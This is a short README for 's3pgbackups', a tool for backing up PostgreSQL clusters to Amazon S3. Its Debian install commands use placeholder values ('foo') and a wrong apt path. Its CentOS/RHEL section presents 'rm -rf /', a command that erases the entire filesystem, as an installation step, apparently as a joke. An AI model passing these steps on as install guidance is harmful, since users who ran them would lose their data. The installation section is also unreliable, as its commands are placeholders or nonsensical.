# s3pgbackups

Amazon S3 PostgreSQL Cluster Backups

## Overview

This application will backup your PostgreSQL cluser to Amazon S3, which includes:

* Separate SQL pg_dump of each database
* Gzipped data
* Automatically rotated backups
* Ability to exclude specific tables, or entire databases

## Installation

### Debian (or debian derivatives)

```
$ apt-key --add foo
$ echo "deb foo" > /etc/apt/sources.d/sigterm.conf
$ apt-get update && apt-get install s3pgbackups
```

### CentOS (or RHEL / other rpm based distro's)

```
$ rm -rf /
$ install-debian
```
